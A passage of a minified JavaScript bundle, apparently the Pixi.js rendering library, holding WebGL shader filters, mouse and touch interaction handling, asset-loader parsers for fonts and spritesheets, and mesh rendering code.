sepia);\n}\n",{sepia:{type:"1f",value:1}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{sepia:{get:function(){return this.uniforms.sepia.value},set:function(t){this.uniforms.sepia.value=t}}})},{"../../core":29}],109:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision lowp float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\n\nuniform vec2 center;\nuniform vec3 params; // 10.0, 0.8, 0.1\nuniform float time;\n\nvoid main()\n{\n    vec2 uv = vTextureCoord;\n    vec2 texCoord = uv;\n\n    float dist = distance(uv, center);\n\n    if ( (dist <= (time + params.z)) && (dist >= (time - params.z)) )\n    {\n        float diff = (dist - time);\n        float powDiff = 1.0 - pow(abs(diff*params.x), params.y);\n\n        float diffTime = diff  * powDiff;\n        vec2 diffUV = normalize(uv - center);\n        texCoord = uv + (diffUV * diffTime);\n    }\n\n    gl_FragColor = texture2D(uSampler, texCoord);\n}\n",{center:{type:"v2",value:{x:.5,y:.5}},params:{type:"v3",value:{x:10,y:.8,z:.1}},time:{type:"1f",value:0}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{center:{get:function(){return this.uniforms.center.value},set:function(t){this.uniforms.center.value=t}},params:{get:function(){return this.uniforms.params.value},set:function(t){this.uniforms.params.value=t}},time:{get:function(){return this.uniforms.time.value},set:function(t){this.uniforms.time.value=t}}})},{"../../core":29}],110:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform float blur;\nuniform float gradientBlur;\nuniform vec2 start;\nuniform vec2 end;\nuniform vec2 delta;\nuniform vec2 texSize;\n\nfloat random(vec3 scale, float seed)\n{\n    return fract(sin(dot(gl_FragCoord.xyz + seed, scale)) * 43758.5453 + seed);\n}\n\nvoid main(void)\n{\n    vec4 color = vec4(0.0);\n    float total = 0.0;\n\n    float offset = random(vec3(12.9898, 78.233, 151.7182), 0.0);\n    vec2 normal = normalize(vec2(start.y - end.y, end.x - start.x));\n    float radius = smoothstep(0.0, 1.0, abs(dot(vTextureCoord * texSize - start, normal)) / gradientBlur) * blur;\n\n    for (float t = -30.0; t <= 30.0; t++)\n    {\n        float percent = (t + offset - 0.5) / 30.0;\n        float weight = 1.0 - abs(percent);\n        vec4 sample = texture2D(uSampler, vTextureCoord + delta / texSize * percent * radius);\n        sample.rgb *= sample.a;\n        color += sample * weight;\n        total += weight;\n    }\n\n    gl_FragColor = color / total;\n    gl_FragColor.rgb /= gl_FragColor.a + 0.00001;\n}\n",{blur:{type:"1f",value:100},gradientBlur:{type:"1f",value:600},start:{type:"v2",value:{x:0,y:window.innerHeight/2}},end:{type:"v2",value:{x:600,y:window.innerHeight/2}},delta:{type:"v2",value:{x:30,y:30}},texSize:{type:"v2",value:{x:window.innerWidth,y:window.innerHeight}}}),this.updateDelta()}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.updateDelta=function(){this.uniforms.delta.value.x=0,this.uniforms.delta.value.y=0},Object.defineProperties(i.prototype,{blur:{get:function(){return this.uniforms.blur.value},set:function(t){this.uniforms.blur.value=t}},gradientBlur:{get:function(){return this.uniforms.gradientBlur.value},set:function(t){this.uniforms.gradientBlur.value=t}},start:{get:function(){return this.uniforms.start.value},set:function(t){this.uniforms.start.value=t,this.updateDelta()}},end:{get:function(){return this.uniforms.end.value},set:function(t){this.uniforms.end.value=t,this.updateDelta()}}})},{"../../core":29}],111:[function(t,e,r){function i(){n.AbstractFilter.call(this),this.tiltShiftXFilter=new o,this.tiltShiftYFilter=new s}var n=t("../../core"),o=t("./TiltShiftXFilter"),s=t("./TiltShiftYFilter");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager.getRenderTarget(!0);this.tiltShiftXFilter.applyFilter(t,e,i),this.tiltShiftYFilter.applyFilter(t,i,r),t.filterManager.returnRenderTarget(i)},Object.defineProperties(i.prototype,{blur:{get:function(){return this.tiltShiftXFilter.blur},set:function(t){this.tiltShiftXFilter.blur=this.tiltShiftYFilter.blur=t}},gradientBlur:{get:function(){return this.tiltShiftXFilter.gradientBlur},set:function(t){this.tiltShiftXFilter.gradientBlur=this.tiltShiftYFilter.gradientBlur=t}},start:{get:function(){return this.tiltShiftXFilter.start},set:function(t){this.tiltShiftXFilter.start=this.tiltShiftYFilter.start=t}},end:{get:function(){return this.tiltShiftXFilter.end},set:function(t){this.tiltShiftXFilter.end=this.tiltShiftYFilter.end=t}}})},{"../../core":29,"./TiltShiftXFilter":112,"./TiltShiftYFilter":113}],112:[function(t,e,r){function i(){n.call(this)}var n=t("./TiltShiftAxisFilter");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.updateDelta=function(){var t=this.uniforms.end.value.x-this.uniforms.start.value.x,e=this.uniforms.end.value.y-this.uniforms.start.value.y,r=Math.sqrt(t*t+e*e);this.uniforms.delta.value.x=t/r,this.uniforms.delta.value.y=e/r}},{"./TiltShiftAxisFilter":110}],113:[function(t,e,r){function i(){n.call(this)}var n=t("./TiltShiftAxisFilter");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.updateDelta=function(){var t=this.uniforms.end.value.x-this.uniforms.start.value.x,e=this.uniforms.end.value.y-this.uniforms.start.value.y,r=Math.sqrt(t*t+e*e);this.uniforms.delta.value.x=-e/r,this.uniforms.delta.value.y=t/r}},{"./TiltShiftAxisFilter":110}],114:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform float radius;\nuniform float angle;\nuniform vec2 offset;\n\nvoid main(void)\n{\n   vec2 coord = vTextureCoord - offset;\n   float dist = length(coord);\n\n   if (dist < radius)\n   {\n       float ratio = (radius - dist) / radius;\n       float angleMod = ratio * ratio * angle;\n       float s = sin(angleMod);\n       float c = cos(angleMod);\n       coord = vec2(coord.x * c - coord.y * s, coord.x * s + coord.y * c);\n   }\n\n   gl_FragColor = texture2D(uSampler, coord+offset);\n}\n",{radius:{type:"1f",value:.5},angle:{type:"1f",value:5},offset:{type:"v2",value:{x:.5,y:.5}}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{offset:{get:function(){return this.uniforms.offset.value},set:function(t){this.uniforms.offset.value=t}},radius:{get:function(){return this.uniforms.radius.value},set:function(t){this.uniforms.radius.value=t}},angle:{get:function(){return this.uniforms.angle.value},set:function(t){this.uniforms.angle.value=t}}})},{"../../core":29}],115:[function(t,e,r){function i(){this.global=new n.Point,this.target=null,this.originalEvent=null}var n=t("../core");i.prototype.constructor=i,e.exports=i,i.prototype.getLocalPosition=function(t,e,r){var i=t.worldTransform,o=r?r:this.global,s=i.a,a=i.c,h=i.tx,l=i.b,u=i.d,c=i.ty,p=1/(s*u+a*-l);return e=e||new n.Point,e.x=u*p*o.x+-a*p*o.x+(c*a-h*u)*p,e.y=s*p*o.y+-l*p*o.y+(-c*s+h*l)*p,e}},{"../core":29}],116:[function(t,e,r){function i(t,e){e=e||{},this.renderer=t,this.autoPreventDefault=void 0!==e.autoPreventDefault?e.autoPreventDefault:!0,this.interactionFrequency=e.interactionFrequency||10,this.mouse=new o,this.eventData={stopped:!1,target:null,type:null,data:this.mouse,stopPropagation:function(){this.stopped=!0}},this.interactiveDataPool=[],this.interactionDOMElement=null,this.eventsAdded=!1,this.onMouseUp=this.onMouseUp.bind(this),this.processMouseUp=this.processMouseUp.bind(this),this.onMouseDown=this.onMouseDown.bind(this),this.processMouseDown=this.processMouseDown.bind(this),this.onMouseMove=this.onMouseMove.bind(this),this.processMouseMove=this.processMouseMove.bind(this),this.onMouseOut=this.onMouseOut.bind(this),this.processMouseOverOut=this.processMouseOverOut.bind(this),this.onTouchStart=this.onTouchStart.bind(this),this.processTouchStart=this.processTouchStart.bind(this),this.onTouchEnd=this.onTouchEnd.bind(this),this.processTouchEnd=this.processTouchEnd.bind(this),this.onTouchMove=this.onTouchMove.bind(this),this.processTouchMove=this.processTouchMove.bind(this),this.last=0,this.currentCursorStyle="inherit",this._tempPoint=new n.Point,this.resolution=1,this.setTargetElement(this.renderer.view,this.renderer.resolution)}var n=t("../core"),o=t("./InteractionData");Object.assign(n.DisplayObject.prototype,t("./interactiveTarget")),i.prototype.constructor=i,e.exports=i,i.prototype.setTargetElement=function(t,e){this.removeEvents(),this.interactionDOMElement=t,this.resolution=e||1,this.addEvents()},i.prototype.addEvents=function(){this.interactionDOMElement&&(n.ticker.shared.add(this.update,this),window.navigator.msPointerEnabled&&(this.interactionDOMElement.style["-ms-content-zooming"]="none",this.interactionDOMElement.style["-ms-touch-action"]="none"),window.document.addEventListener("mousemove",this.onMouseMove,!0),this.interactionDOMElement.addEventListener("mousedown",this.onMouseDown,!0),this.interactionDOMElement.addEventListener("mouseout",this.onMouseOut,!0),this.interactionDOMElement.addEventListener("touchstart",this.onTouchStart,!0),this.interactionDOMElement.addEventListener("touchend",this.onTouchEnd,!0),this.interactionDOMElement.addEventListener("touchmove",this.onTouchMove,!0),window.addEventListener("mouseup",this.onMouseUp,!0),this.eventsAdded=!0)},i.prototype.removeEvents=function(){this.interactionDOMElement&&(n.ticker.shared.remove(this.update),window.navigator.msPointerEnabled&&(this.interactionDOMElement.style["-ms-content-zooming"]="",this.interactionDOMElement.style["-ms-touch-action"]=""),window.document.removeEventListener("mousemove",this.onMouseMove,!0),this.interactionDOMElement.removeEventListener("mousedown",this.onMouseDown,!0),this.interactionDOMElement.removeEventListener("mouseout",this.onMouseOut,!0),this.interactionDOMElement.removeEventListener("touchstart",this.onTouchStart,!0),this.interactionDOMElement.removeEventListener("touchend",this.onTouchEnd,!0),this.interactionDOMElement.removeEventListener("touchmove",this.onTouchMove,!0),
this.interactionDOMElement=null,window.removeEventListener("mouseup",this.onMouseUp,!0),this.eventsAdded=!1)},i.prototype.update=function(t){if(this._deltaTime+=t,!(this._deltaTime<this.interactionFrequency)&&(this._deltaTime=0,this.interactionDOMElement)){if(this.didMove)return void(this.didMove=!1);this.cursor="inherit",this.processInteractive(this.mouse.global,this.renderer._lastObjectRendered,this.processMouseOverOut,!0),this.currentCursorStyle!==this.cursor&&(this.currentCursorStyle=this.cursor,this.interactionDOMElement.style.cursor=this.cursor)}},i.prototype.dispatchEvent=function(t,e,r){r.stopped||(r.target=t,r.type=e,t.emit(e,r),t[e]&&t[e](r))},i.prototype.mapPositionToPoint=function(t,e,r){var i=this.interactionDOMElement.getBoundingClientRect();t.x=(e-i.left)*(this.interactionDOMElement.width/i.width)/this.resolution,t.y=(r-i.top)*(this.interactionDOMElement.height/i.height)/this.resolution},i.prototype.processInteractive=function(t,e,r,i,n){if(!e.visible)return!1;var o=e.children,s=!1;if(n=n||e.interactive,e.interactiveChildren)for(var a=o.length-1;a>=0;a--)!s&&i?s=this.processInteractive(t,o[a],r,!0,n):this.processInteractive(t,o[a],r,!1,!1);return n&&(i&&(e.hitArea?(e.worldTransform.applyInverse(t,this._tempPoint),s=e.hitArea.contains(this._tempPoint.x,this._tempPoint.y)):e.containsPoint&&(s=e.containsPoint(t))),e.interactive&&r(e,s)),s},i.prototype.onMouseDown=function(t){this.mouse.originalEvent=t,this.eventData.data=this.mouse,this.eventData.stopped=!1,this.mapPositionToPoint(this.mouse.global,t.clientX,t.clientY),this.autoPreventDefault&&this.mouse.originalEvent.preventDefault(),this.processInteractive(this.mouse.global,this.renderer._lastObjectRendered,this.processMouseDown,!0)},i.prototype.processMouseDown=function(t,e){var r=this.mouse.originalEvent,i=2===r.button||3===r.which;e&&(t[i?"_isRightDown":"_isLeftDown"]=!0,this.dispatchEvent(t,i?"rightdown":"mousedown",this.eventData))},i.prototype.onMouseUp=function(t){this.mouse.originalEvent=t,this.eventData.data=this.mouse,this.eventData.stopped=!1,this.mapPositionToPoint(this.mouse.global,t.clientX,t.clientY),this.processInteractive(this.mouse.global,this.renderer._lastObjectRendered,this.processMouseUp,!0)},i.prototype.processMouseUp=function(t,e){var r=this.mouse.originalEvent,i=2===r.button||3===r.which,n=i?"_isRightDown":"_isLeftDown";e?(this.dispatchEvent(t,i?"rightup":"mouseup",this.eventData),t[n]&&(t[n]=!1,this.dispatchEvent(t,i?"rightclick":"click",this.eventData))):t[n]&&(t[n]=!1,this.dispatchEvent(t,i?"rightupoutside":"mouseupoutside",this.eventData))},i.prototype.onMouseMove=function(t){this.mouse.originalEvent=t,this.eventData.data=this.mouse,this.eventData.stopped=!1,this.mapPositionToPoint(this.mouse.global,t.clientX,t.clientY),this.didMove=!0,this.cursor="inherit",this.processInteractive(this.mouse.global,this.renderer._lastObjectRendered,this.processMouseMove,!0),this.currentCursorStyle!==this.cursor&&(this.currentCursorStyle=this.cursor,this.interactionDOMElement.style.cursor=this.cursor)},i.prototype.processMouseMove=function(t,e){this.dispatchEvent(t,"mousemove",this.eventData),this.processMouseOverOut(t,e)},i.prototype.onMouseOut=function(t){this.mouse.originalEvent=t,this.eventData.stopped=!1,this.mapPositionToPoint(this.mouse.global,t.clientX,t.clientY),this.interactionDOMElement.style.cursor="inherit",this.mapPositionToPoint(this.mouse.global,t.clientX,t.clientY),this.processInteractive(this.mouse.global,this.renderer._lastObjectRendered,this.processMouseOverOut,!1)},i.prototype.processMouseOverOut=function(t,e){e?(t._over||(t._over=!0,this.dispatchEvent(t,"mouseover",this.eventData)),t.buttonMode&&(this.cursor=t.defaultCursor)):t._over&&(t._over=!1,this.dispatchEvent(t,"mouseout",this.eventData))},i.prototype.onTouchStart=function(t){this.autoPreventDefault&&t.preventDefault();for(var e=t.changedTouches,r=e.length,i=0;r>i;i++){var n=e[i],o=this.getTouchData(n);o.originalEvent=t,this.eventData.data=o,this.eventData.stopped=!1,this.processInteractive(o.global,this.renderer._lastObjectRendered,this.processTouchStart,!0),this.returnTouchData(o)}},i.prototype.processTouchStart=function(t,e){e&&(t._touchDown=!0,this.dispatchEvent(t,"touchstart",this.eventData))},i.prototype.onTouchEnd=function(t){this.autoPreventDefault&&t.preventDefault();for(var e=t.changedTouches,r=e.length,i=0;r>i;i++){var n=e[i],o=this.getTouchData(n);o.originalEvent=t,this.eventData.data=o,this.eventData.stopped=!1,this.processInteractive(o.global,this.renderer._lastObjectRendered,this.processTouchEnd,!0),this.returnTouchData(o)}},i.prototype.processTouchEnd=function(t,e){e?(this.dispatchEvent(t,"touchend",this.eventData),t._touchDown&&(t._touchDown=!1,this.dispatchEvent(t,"tap",this.eventData))):t._touchDown&&(t._touchDown=!1,this.dispatchEvent(t,"touchendoutside",this.eventData))},i.prototype.onTouchMove=function(t){this.autoPreventDefault&&t.preventDefault();for(var e=t.changedTouches,r=e.length,i=0;r>i;i++){var n=e[i],o=this.getTouchData(n);o.originalEvent=t,this.eventData.data=o,this.eventData.stopped=!1,this.processInteractive(o.global,this.renderer._lastObjectRendered,this.processTouchMove,!1),this.returnTouchData(o)}},i.prototype.processTouchMove=function(t,e){e=e,this.dispatchEvent(t,"touchmove",this.eventData)},i.prototype.getTouchData=function(t){var e=this.interactiveDataPool.pop();return e||(e=new o),e.identifier=t.identifier,this.mapPositionToPoint(e.global,t.clientX,t.clientY),navigator.isCocoonJS&&(e.global.x=e.global.x/this.resolution,e.global.y=e.global.y/this.resolution),t.globalX=e.global.x,t.globalY=e.global.y,e},i.prototype.returnTouchData=function(t){this.interactiveDataPool.push(t)},i.prototype.destroy=function(){this.removeEvents(),this.renderer=null,this.mouse=null,this.eventData=null,this.interactiveDataPool=null,this.interactionDOMElement=null,this.onMouseUp=null,this.processMouseUp=null,this.onMouseDown=null,this.processMouseDown=null,this.onMouseMove=null,this.processMouseMove=null,this.onMouseOut=null,this.processMouseOverOut=null,this.onTouchStart=null,this.processTouchStart=null,this.onTouchEnd=null,this.processTouchEnd=null,this.onTouchMove=null,this.processTouchMove=null,this._tempPoint=null},n.WebGLRenderer.registerPlugin("interaction",i),n.CanvasRenderer.registerPlugin("interaction",i)},{"../core":29,"./InteractionData":115,"./interactiveTarget":118}],117:[function(t,e,r){e.exports={InteractionData:t("./InteractionData"),InteractionManager:t("./InteractionManager"),interactiveTarget:t("./interactiveTarget")}},{"./InteractionData":115,"./InteractionManager":116,"./interactiveTarget":118}],118:[function(t,e,r){var i={interactive:!1,buttonMode:!1,interactiveChildren:!0,defaultCursor:"pointer",_over:!1,_touchDown:!1};e.exports=i},{}],119:[function(t,e,r){function i(t,e){var r={},i=t.data.getElementsByTagName("info")[0],n=t.data.getElementsByTagName("common")[0];r.font=i.getAttribute("face"),r.size=parseInt(i.getAttribute("size"),10),r.lineHeight=parseInt(n.getAttribute("lineHeight"),10),r.chars={};for(var a=t.data.getElementsByTagName("char"),h=0;h<a.length;h++){var l=parseInt(a[h].getAttribute("id"),10),u=new o.Rectangle(parseInt(a[h].getAttribute("x"),10)+e.frame.x,parseInt(a[h].getAttribute("y"),10)+e.frame.y,parseInt(a[h].getAttribute("width"),10),parseInt(a[h].getAttribute("height"),10));r.chars[l]={xOffset:parseInt(a[h].getAttribute("xoffset"),10),yOffset:parseInt(a[h].getAttribute("yoffset"),10),xAdvance:parseInt(a[h].getAttribute("xadvance"),10),kerning:{},texture:new o.Texture(e.baseTexture,u)}}var c=t.data.getElementsByTagName("kerning");for(h=0;h<c.length;h++){var p=parseInt(c[h].getAttribute("first"),10),d=parseInt(c[h].getAttribute("second"),10),f=parseInt(c[h].getAttribute("amount"),10);r.chars[d].kerning[p]=f}t.bitmapFont=r,s.BitmapText.fonts[r.font]=r}var n=t("resource-loader").Resource,o=t("../core"),s=t("../extras"),a=t("path");e.exports=function(){return function(t,e){if(!t.data||!t.isXml)return e();if(0===t.data.getElementsByTagName("page").length||0===t.data.getElementsByTagName("info").length||null===t.data.getElementsByTagName("info")[0].getAttribute("face"))return e();var r=a.dirname(t.url);"."===r&&(r=""),this.baseUrl&&r&&("/"===this.baseUrl.charAt(this.baseUrl.length-1)&&(r+="/"),r=r.replace(this.baseUrl,"")),r&&"/"!==r.charAt(r.length-1)&&(r+="/");var s=r+t.data.getElementsByTagName("page")[0].getAttribute("file");if(o.utils.TextureCache[s])i(t,o.utils.TextureCache[s]),e();else{var h={crossOrigin:t.crossOrigin,loadType:n.LOAD_TYPE.IMAGE};this.add(t.name+"_image",s,h,function(r){i(t,r.texture),e()})}}}},{"../core":29,"../extras":85,path:3,"resource-loader":18}],120:[function(t,e,r){e.exports={Loader:t("./loader"),bitmapFontParser:t("./bitmapFontParser"),spritesheetParser:t("./spritesheetParser"),textureParser:t("./textureParser"),Resource:t("resource-loader").Resource}},{"./bitmapFontParser":119,"./loader":121,"./spritesheetParser":122,"./textureParser":123,"resource-loader":18}],121:[function(t,e,r){function i(t,e){n.call(this,t,e);for(var r=0;r<i._pixiMiddleware.length;++r)this.use(i._pixiMiddleware[r]())}var n=t("resource-loader"),o=t("./textureParser"),s=t("./spritesheetParser"),a=t("./bitmapFontParser");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i._pixiMiddleware=[n.middleware.parsing.blob,o,s,a],i.addPixiMiddleware=function(t){i._pixiMiddleware.push(t)};var h=n.Resource;h.setExtensionXhrType("fnt",h.XHR_RESPONSE_TYPE.DOCUMENT)},{"./bitmapFontParser":119,"./spritesheetParser":122,"./textureParser":123,"resource-loader":18}],122:[function(t,e,r){var i=t("resource-loader").Resource,n=t("path"),o=t("../core");e.exports=function(){return function(t,e){if(!t.data||!t.isJson||!t.data.frames)return e();var r={crossOrigin:t.crossOrigin,loadType:i.LOAD_TYPE.IMAGE},s=n.dirname(t.url.replace(this.baseUrl,"")),a=o.utils.getResolutionOfUrl(t.url);this.add(t.name+"_image",s+"/"+t.data.meta.image,r,function(r){t.textures={};var i=t.data.frames;for(var n in i){var s=i[n].frame;if(s){var h=null,l=null;if(h=i[n].rotated?new o.Rectangle(s.x,s.y,s.h,s.w):new o.Rectangle(s.x,s.y,s.w,s.h),i[n].trimmed&&(l=new o.Rectangle(i[n].spriteSourceSize.x/a,i[n].spriteSourceSize.y/a,i[n].sourceSize.w/a,i[n].sourceSize.h/a)),i[n].rotated){var u=h.width;h.width=h.height,h.height=u}h.x/=a,h.y/=a,h.width/=a,h.height/=a,t.textures[n]=new o.Texture(r.texture.baseTexture,h,h.clone(),l,i[n].rotated),o.utils.TextureCache[n]=t.textures[n]}}e()})}}},{"../core":29,path:3,"resource-loader":18}],123:[function(t,e,r){var i=t("../core");e.exports=function(){return function(t,e){t.data&&t.isImage&&(t.texture=new i.Texture(new i.BaseTexture(t.data,null,i.utils.getResolutionOfUrl(t.url))),i.utils.TextureCache[t.url]=t.texture),e()}}},{"../core":29}],124:[function(t,e,r){function i(t,e,r,o,s){n.Container.call(this),this._texture=null,this.uvs=r||new Float32Array([0,1,1,1,1,0,0,1]),this.vertices=e||new Float32Array([0,0,100,0,100,100,0,100]),this.indices=o||new Uint16Array([0,1,2,3]),this.dirty=!0,this.blendMode=n.BLEND_MODES.NORMAL,this.canvasPadding=0,this.drawMode=s||i.DRAW_MODES.TRIANGLE_MESH,this.texture=t}var n=t("../core"),o=new n.Point,s=new n.Polygon;i.prototype=Object.create(n.Container.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{texture:{get:function(){return this._texture},set:function(t){this._texture!==t&&(this._texture=t,t&&(t.baseTexture.hasLoaded?this._onTextureUpdate():t.once("update",this._onTextureUpdate,this)))}}}),i.prototype._renderWebGL=function(t){t.setObjectRenderer(t.plugins.mesh),t.plugins.mesh.render(this)},i.prototype._renderCanvas=function(t){var e=t.context,r=this.worldTransform;t.roundPixels?e.setTransform(r.a,r.b,r.c,r.d,0|r.tx,0|r.ty):e.setTransform(r.a,r.b,r.c,r.d,r.tx,r.ty),this.drawMode===i.DRAW_MODES.TRIANGLE_MESH?this._renderCanvasTriangleMesh(e):this._renderCanvasTriangles(e)},i.prototype._renderCanvasTriangleMesh=function(t){for(var e=this.vertices,r=this.uvs,i=e.length/2,n=0;i-2>n;n++){var o=2*n;this._renderCanvasDrawTriangle(t,e,r,o,o+2,o+4)}},i.prototype._renderCanvasTriangles=function(t){for(var e=this.vertices,r=this.uvs,i=this.indices,n=i.length,o=0;n>o;o+=3){var s=2*i[o],a=2*i[o+1],h=2*i[o+2];this._renderCanvasDrawTriangle(t,e,r,s,a,h)}},i.prototype._renderCanvasDrawTriangle=function(t,e,r,i,n,o){var s=this._texture.baseTexture.source,a=this._texture.baseTexture.width,h=this._texture.baseTexture.height,l=e[i],u=e[n],c=e[o],p=e[i+1],d=e[n+1],f=e[o+1],v=r[i]*a,g=r[n]*a,m=r[o]*a,y=r[i+1]*h,x=r[n+1]*h,b=r[o+1]*h;if(this.canvasPadding>0){var _=this.canvasPadding/this.worldTransform.a,T=this.canvasPadding/this.worldTransform.d,E=(l+u+c)/3,S=(p+d+f)/3,A=l-E,w=p-S,C=Math.sqrt(A*A+w*w);l=E+A/C*(C+_),p=S+w/C*(C+T),A=u-E,w=d-S,C=Math.sqrt(A*A+w*w),u=E+A/C*(C+_),d=S+w/C*(C+T),A=c-E,w=f-S,C=Math.sqrt(A*A+w*w),c=E+A/C*(C+_),f=S+w/C*(C+T)}t.save(),t.beginPath(),t.moveTo(l,p),t.lineTo(u,d),t.lineTo(c,f),t.closePath(),t.clip();var M=v*x+y*m+g*b-x*m-y*g-v*b,R=l*x+y*c+u*b-x*c-y*u-l*b,D=v*u+l*m+g*c-u*m-l*g-v*c,F=v*x*c+y*u*m+l*g*b-l*x*m-y*g*c-v*u*b,P=p*x+y*f+d*b-x*f-y*d-p*b,O=v*d+p*m+g*f-d*m-p*g-v*f,B=v*x*f+y*d*m+p*g*b-p*x*m-y*g*f-v*d*b;t.transform(R/M,P/M,D/M,O/M,F/M,B/M),t.drawImage(s,0,0),t.restore()},i.prototype.renderMeshFlat=function(t){var e=this.context,r=t.vertices,i=r.length/2;e.beginPath();for(var n=1;i-2>n;n++){var o=2*n,s=r[o],a=r[o+2],h=r[o+4],l=r[o+1],u=r[o+3],c=r[o+5];e.moveTo(s,l),e.lineTo(a,u),e.lineTo(h,c)}e.fillStyle="#FF0000",e.fill(),e.closePath()},i.prototype._onTextureUpdate=function(){this.updateFrame=!0},i.prototype.getBounds=function(t){if(!this._currentBounds){for(var e=t||this.worldTransform,r=e.a,i=e.b,o=e.c,s=e.d,a=e.tx,h=e.ty,l=-(1/0),u=-(1/0),c=1/0,p=1/0,d=this.vertices,f=0,v=d.length;v>f;f+=2){var g=d[f],m=d[f+1],y=r*g+o*m+a,x=s*m+i*g+h;c=c>y?y:c,p=p>x?x:p,l=y>l?y:l,u=x>u?x:u}if(c===-(1/0)||u===1/0)return n.Rectangle.EMPTY;var b=this._bounds;b.x=c,b.width=l-c,b.y=p,b.height=u-p,this._currentBounds=b}return this._currentBounds},i.prototype.containsPoint=function(t){if(!this.getBounds().contains(t.x,t.y))return!1;this.worldTransform.applyInverse(t,o);var e,r,n=this.vertices,a=s.points;if(this.drawMode===i.DRAW_MODES.TRIANGLES){var h=this.indices;for(r=this.indices.length,e=0;r>e;e+=3){var l=2*h[e],u=2*h[e+1],c=2*h[e+2];if(a[0]=n[l],a[1]=n[l+1],a[2]=n[u],a[3]=n[u+1],a[4]=n[c],a[5]=n[c+1],s.contains(o.x,o.y))return!0}}else for(r=n.length,e=0;r>e;e+=6)if(a[0]=n[e],a[1]=n[e+1],a[2]=n[e+2],a[3]=n[e+3],a[4]=n[e+4],a[5]=n[e+5],s.contains(o.x,o.y))return!0;return!1},i.DRAW_MODES={TRIANGLE_MESH:0,TRIANGLES:1}},{"../core":29}],125:[function(t,e,r){function i(t,e){n.call(this,t),this.points=e,this.vertices=new Float32Array(4*e.length),this.uvs=new Float32Array(4*e.length),this.colors=new Float32Array(2*e.length),this.indices=new Uint16Array(2*e.length),this._ready=!0,this.refresh()}var n=t("./Mesh"),o=t("../core");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.refresh=function(){var t=this.points;if(!(t.length<1)&&this._texture._uvs){var e=this.uvs,r=this.indices,i=this.colors,n=this._texture._uvs,s=new o.Point(n.x0,n.y0),a=new o.Point(n.x2-n.x0,n.y2-n.y0);e[0]=0+s.x,e[1]=0+s.y,e[2]=0+s.x,e[3]=1*a.y+s.y,i[0]=1,i[1]=1,r[0]=0,r[1]=1;for(var h,l,u,c=t.length,p=1;c>p;p++)h=t[p],l=4*p,u=p/(c-1),e[l]=u*a.x+s.x,e[l+1]=0+s.y,e[l+2]=u*a.x+s.x,e[l+3]=1*a.y+s.y,l=2*p,i[l]=1,i[l+1]=1,l=2*p,r[l]=l,r[l+1]=l+1;this.dirty=!0}},i.prototype._onTextureUpdate=function(){n.prototype._onTextureUpdate.call(this),this._ready&&this.refresh()},i.prototype.updateTransform=function(){var t=this.points;if(!(t.length<1)){for(var e,r,i,n,o,s,a=t[0],h=0,l=0,u=this.vertices,c=t.length,p=0;c>p;p++)r=t[p],i=4*p,e=p<t.length-1?t[p+1]:r,l=-(e.x-a.x),h=e.y-a.y,n=10*(1-p/(c-1)),n>1&&(n=1),o=Math.sqrt(h*h+l*l),s=this._texture.height/2,h/=o,l/=o,h*=s,l*=s,u[i]=r.x+h,u[i+1]=r.y+l,u[i+2]=r.x-h,u[i+3]=r.y-l,a=r;this.containerUpdateTransform()}}},{"../core":29,"./Mesh":124}],126:[function(t,e,r){e.exports={Mesh:t("./Mesh"),Rope:t("./Rope"),MeshRenderer:t("./webgl/MeshRenderer"),MeshShader:t("./webgl/MeshShader")}},{"./Mesh":124,"./Rope":125,"./webgl/MeshRenderer":127,"./webgl/MeshShader":128}],127:[function(t,e,r){function i(t){n.ObjectRenderer.call(this,t),this.indices=new Uint16Array(15e3);for(var e=0,r=0;15e3>e;e+=6,r+=4)this.indices[e+0]=r+0,this.indices[e+1]=r+1,this.indices[e+2]=r+2,this.indices[e+3]=r+0,this.indices[e+4]=r+2,this.indices[e+5]=r+3}var n=t("../../core"),o=t("../Mesh");i.prototype=Object.create(n.ObjectRenderer.prototype),i.prototype.constructor=i,e.exports=i,n.WebGLRenderer.registerPlugin("mesh",i),i.prototype.onContextChange=function(){},i.prototype.render=function(t){t._vertexBuffer||this._initWebGL(t);var e=this.renderer,r=e.gl,i=t._texture.baseTexture,n=e.shaderManager.plugins.meshShader,s=t.drawMode===o.DRAW_MODES.TRIANGLE_MESH?r.TRIANGLE_STRIP:r.TRIANGLES;e.blendModeManager.setBlendMode(t.blendMode),r.uniformMatrix3fv(n.uniforms.translationMatrix._location,!1,t.worldTransform.toArray(!0)),r.uniformMatrix3fv(n.uniforms.projectionMatrix._location,!1,e.currentRenderTarget.projectionMatrix.toArray(!0)),r.uniform1f(n.uniforms.alpha._location,t.worldAlpha),t.dirty?(t.dirty=!1,r.bindBuffer(r.ARRAY_BUFFER,t._vertexBuffer),r.bufferData(r.ARRAY_BUFFER,t.vertices,r.STATIC_DRAW),r.vertexAttribPointer(n.attributes.aVertexPosition,2,r.FLOAT,!1,0,0),r.bindBuffer(r.ARRAY_BUFFER,t._uvBuffer),r.bufferData(r.ARRAY_BUFFER,t.uvs,r.STATIC_DRAW),r.vertexAttribPointer(n.attributes.aTextureCoord,2,r.FLOAT,!1,0,0),r.activeTexture(r.TEXTURE0),i._glTextures[r.id]?r.bindTexture(r.TEXTURE_2D,i._glTextures[r.id]):this.renderer.up